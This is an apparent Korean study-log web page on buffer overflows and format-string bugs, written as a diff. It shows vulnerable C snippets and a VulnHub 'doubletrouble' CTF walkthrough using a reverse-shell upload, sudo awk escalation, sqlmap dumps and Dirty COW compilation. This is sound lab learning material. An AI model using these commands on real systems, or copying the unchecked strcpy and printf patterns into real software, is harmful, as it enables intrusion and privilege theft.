@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Buffer Overflow — 조경익</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Noto+Sans+KR:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#ffffff; --bg-alt:#f5f6f8; --panel:#f7f8fa; --panel-border:#e2e5ea;
+    --text:#1a1f24; --text-dim:#4b5560; --text-faint:#7c8894; --accent:#0f9d8f; --line:#e5e8ec;
+    --c-concept:#7c3aed;
+  }
+  *{box-sizing:border-box; margin:0; padding:0;}
+  body{background:radial-gradient(ellipse at top left, rgba(94,234,212,0.06), transparent 45%), var(--bg);
+    color:var(--text); font-family:'Noto Sans KR', sans-serif; line-height:1.7; -webkit-font-smoothing:antialiased;}
+  .mono{font-family:'JetBrains Mono', monospace;}
+  a{color:inherit; text-decoration:none;}
+  .wrap{max-width:760px; margin:0 auto; padding:0 24px;}
+  .topbar{border-bottom:1px solid var(--line); background:rgba(255,255,255,0.9); backdrop-filter:blur(6px);}
+  .topbar-inner{display:flex; align-items:center; gap:16px; padding:14px 24px; max-width:760px; margin:0 auto;
+    font-family:'JetBrains Mono',monospace; font-size:12.5px; color:var(--text-dim);}
+  .topbar-inner a:hover{color:var(--accent);}
+  .sep{color:var(--text-faint);}
+  .hero{padding:44px 0 28px; border-bottom:1px solid var(--line); margin-bottom:32px;}
+  .eyebrow{font-family:'JetBrains Mono',monospace; font-size:12px; color:var(--c-concept); letter-spacing:.08em; margin-bottom:14px;}
+  .hero h1{font-size:clamp(24px,4vw,32px); font-weight:900; margin-bottom:10px;}
+  .hero p{color:var(--text-dim); font-size:14px;}
+  .content{padding-bottom:70px;}
+  .content h2{font-size:19px; font-weight:700; margin:32px 0 12px; padding-bottom:8px; border-bottom:1px solid var(--line);}
+  .content h3{font-size:15px; font-weight:700; margin:20px 0 8px; color:var(--c-concept);}
+  .content p{font-size:14px; color:var(--text-dim); margin-bottom:10px;}
+  .content ul{margin:0 0 14px 20px; font-size:14px; color:var(--text-dim);}
+  .content li{margin-bottom:4px;}
+  .content li b{color:var(--text);}
+  .level{margin-bottom:16px; padding:14px 16px; background:var(--panel); border:1px solid var(--panel-border); border-left:3px solid var(--c-concept); border-radius:8px;}
+  .level h4{font-size:13.5px; font-weight:700; margin-bottom:6px; font-family:'JetBrains Mono',monospace;}
+  .level p{margin-bottom:4px; font-size:13.5px; color:var(--text-dim);}
+  table{width:100%; border-collapse:collapse; margin:10px 0 14px; font-size:12.5px;}
+  th, td{border:1px solid var(--panel-border); padding:6px 10px; text-align:left;}
+  th{background:#fff; color:var(--text); font-family:'JetBrains Mono',monospace; font-size:11px;}
+  td{color:var(--text-dim);}
+  pre{background:#fff; border:1px solid var(--panel-border); border-radius:8px; padding:10px 12px;
+    overflow-x:auto; margin:8px 0; font-family:'JetBrains Mono',monospace; font-size:11.5px; color:var(--accent); line-height:1.55;}
+  code.mono{background:#fff; padding:1px 5px; border-radius:4px; font-size:12.5px; border:1px solid var(--panel-border);}
+  footer{border-top:1px solid var(--line); padding:24px 0 50px; text-align:center; font-family:'JetBrains Mono',monospace; font-size:12px; color:var(--text-faint);}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <a href="../../index.html">메인</a><span class="sep">/</span>
+    <a href="../../web.html">웹 해킹 / 워게임</a><span class="sep">/</span>
+    <span>Buffer Overflow</span>
+  </div>
+</div>
+
+<div class="wrap">
+  <section class="hero">
+    <div class="eyebrow mono">📖 개념 정리</div>
+    <h1>Buffer Overflow</h1>
+    <p>메모리 취약점의 기본 원리와 오버플로우 공격 실습 — 인증 우회, 명령어 변조, 포맷 스트링 취약점, CTF 머신 풀이까지</p>
+  </section>
+
+  <div class="content">
+
+    <h2>1. 정의</h2>
+    <p>프로그램이 데이터를 저장하는 공간(버퍼)의 크기를 확인하지 않고 너무 많은 데이터를 넣어서, 주변 메모리까지 덮어쓰는 취약점. 원래 코드 대신 공격자가 원하는 코드를 실행시키는 것이 목적.</p>
+
+    <h2>2. 보호기법</h2>
+    <ul>
+      <li><b>ASLR</b> — 메모리 주소를 랜덤화해 공격자가 주소를 예측하지 못하게 함</li>
+      <li><b>Stack Canary</b> — 버퍼와 RET(Return Address) 사이에 감시값을 넣어 오버플로우를 탐지</li>
+      <li><b>NX bit</b> — 스택 같은 영역에서 코드 실행을 막아 쉘코드 실행을 차단</li>
+      <li><b>PIE</b> — 실행파일 자체 주소를 랜덤화해 함수·ROP 주소 예측을 어렵게 함</li>
+    </ul>
+    <pre>gcc -fno-stack-protector -z execstack -no-pie -o [파일명] [파일명].c</pre>
+    <p>실습을 위해 위 옵션들로 보호기법을 의도적으로 비활성화 — 각각 Stack Canary 끄기, NX bit 우회(스택에서 실행 허용), PIE 끄기(주소 고정) 역할.</p>
+
+    <h2>3. 기본 오버플로우 & Segmentation Fault</h2>
+    <div class="level">
+      <h4>bof_vuln.c</h4>
+      <pre>char buffer[16];
+strcpy(buffer, str);   // 길이 검사 없이 복사 — 취약점 발생 지점</pre>
+      <p>16바이트보다 긴 문자열을 넣으면 <code class="mono">Segmentation fault</code> 발생. 패딩 크기에 따라 RET(복귀 주소)까지 도달하지 못하면 정상 출력 후 종료되고, 더 긴 입력으로 RET까지 덮어쓰면 그 시점에 비정상 종료됨을 확인.</p>
+    </div>
+
+    <h2>4. 인증 우회 (Authentication Bypass)</h2>
+    <div class="level">
+      <h4>bof_auth.c</h4>
+      <pre>volatile int auth_status = 0;
+char password_buffer[16];
+strcpy(password_buffer, argv[1]);   // 길이 제한 없음
+if (strcmp(password_buffer, "secret123") == 0) auth_status = 1;</pre>
+      <p>정답 비밀번호 없이도, 16바이트를 넘는 긴 입력으로 <code class="mono">password_buffer</code>를 넘쳐 바로 옆의 <code class="mono">auth_status</code> 변수 값까지 덮어써서 강제로 "인증 성공" 상태를 만드는 데 성공. 더 긴 입력에서는 이후 Segmentation Fault로 비정상 종료.</p>
+    </div>
+
+    <h2>5. 시스템 명령어 변조</h2>
+    <div class="level">
+      <h4>bof_system.c</h4>
+      <pre>char command[16] = "date";
+char user_buffer[16];
+strcpy(user_buffer, input);   // 취약점
+system(command);</pre>
+      <p>기본 실행 명령은 안전한 <code class="mono">date</code>였지만, <code class="mono">user_buffer</code>를 넘치게 입력해 이어진 메모리의 <code class="mono">command</code> 값을 <code class="mono">whoami</code> 등 다른 명령어로 덮어써서 의도치 않은 명령이 실행되는 것을 확인. 과도하게 침범하면 Segmentation Fault 발생.</p>
+    </div>
+
+    <h2>6. 포맷 스트링 취약점</h2>
+    <p>ASLR을 끄고(<code class="mono">sysctl -w kernel.randomize_va_space=0</code>) 실습. 포맷 지정자 <code class="mono">%p</code>(주소 Leak), <code class="mono">%s</code>(문자열 Leak), <code class="mono">%n</code>(메모리 값 Write)이 핵심.</p>
+    <div class="level">
+      <h4>fs_leak.c — 정보 유출</h4>
+      <pre>printf(user_input);   // 서식 없이 사용자 입력을 그대로 printf에 전달</pre>
+      <p><code class="mono">%p.%p.%p...</code> 형태로 입력하면 스택에 쌓인 메모리 주소 값들이 그대로 노출됨. <code class="mono">%s</code>를 섞으면 그 주소를 문자열로 읽으려다 잘못된 메모리 접근으로 Segmentation Fault가 나기도 함.</p>
+    </div>
+    <div class="level">
+      <h4>fs_write.c — %n으로 값 조작</h4>
+      <p>원래 0(인증 실패)이어야 할 <code class="mono">target_variable</code>을 <code class="mono">%n</code> 포맷 지정자로 직접 덮어써서 값 자체를 조작하는 원리 실습(값 계산까지는 진행 중).</p>
+    </div>
+
+    <h2>7. CTF — doubletrouble (VulnHub)</h2>
+    <p>스테가노그래피부터 SQLi, 커널 취약점까지 여러 단계를 거치는 종합 실습.</p>
+    <div class="level">
+      <h4>1단계 — 초기 침투</h4>
+      <p>gobuster로 <code class="mono">/secret</code> 페이지에서 이미지 파일 발견 → <code class="mono">stegseek</code> + rockyou.txt로 스테가노그래피 비밀번호 크래킹 성공, 숨겨진 계정 정보로 웹 로그인.</p>
+      <p>프로필 사진 업로드 기능에 <code class="mono">php-reverse-shell.php</code> 업로드 → 리스너로 리버스 쉘 연결 성공.</p>
+    </div>
+    <div class="level">
+      <h4>2단계 — 권한 상승 & 내부 VM 발견</h4>
+      <pre>sudo -l   // www-data가 비밀번호 없이 awk를 sudo로 실행 가능
+sudo awk 'BEGIN {system("/bin/bash")}'   // root bash 획득</pre>
+      <p>root 홈 디렉토리에서 <code class="mono">doubletrouble.ova</code> 파일을 발견해 반출, VirtualBox에 설치하니 "inner"라는 이름의 내부 전용 VM 확인.</p>
+    </div>
+    <div class="level">
+      <h4>3단계 — inner VM 침투</h4>
+      <pre>sqlmap -u http://[IP]/index.php -forms --dbs
+sqlmap -u ... -D doubletrouble --tables
+sqlmap -u ... -D doubletrouble -T users --dump</pre>
+      <p>sqlmap으로 로그인 폼의 Time-Based Blind SQL Injection을 자동 탐지해 DB → 테이블 → 계정 정보까지 순서대로 덤프, 획득한 계정으로 SSH 접속해 user flag 획득.</p>
+    </div>
+    <div class="level">
+      <h4>4단계 — 커널 취약점으로 root 획득</h4>
+      <p><code class="mono">uname -a</code>로 커널 버전 확인 후 Dirty COW(Linux Kernel 2.6.22~3.9 PTRACE_POKEDATA Race Condition) 취약점 exploit 코드를 kali에서 받아 파이썬 서버로 전송.</p>
+      <pre>gcc -pthread 40839.c -o dirty -lcrypt
+./dirty
+mv /tmp/passwd.txt /etc/passwd
+su firefart</pre>
+      <p><code class="mono">/etc/passwd</code>에 UID 0(root 권한)의 <code class="mono">firefart</code> 계정을 새로 추가해 root 권한 획득, root flag까지 최종 확보.</p>
+    </div>
+
+  </div>
+
+  <footer>© 2026 조경익 · security learning log</footer>
+</div>
+</body>
+</html>
